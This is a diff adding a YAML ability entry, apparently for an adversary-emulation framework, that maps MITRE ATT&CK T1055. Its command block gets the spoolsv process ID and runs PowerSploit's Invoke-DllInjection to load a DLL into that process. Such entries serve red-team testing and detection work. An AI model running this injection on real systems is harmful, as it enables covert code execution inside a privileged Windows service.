@@ -1,0 +1,15 @@
+---
+
+- id: tacmulti-1055-AR01-1v00-200120190845
+  name: Process Injection via PowerSploit
+  description: .      PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1).  
+  tactic: multiple
+  technique:
+    attack_id: T1055
+    name: Process Injection
+  platforms:
+    windows:
+      psh:
+        command: |
+          $mypid = (get-process spoolsv).id
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll T1055.dll
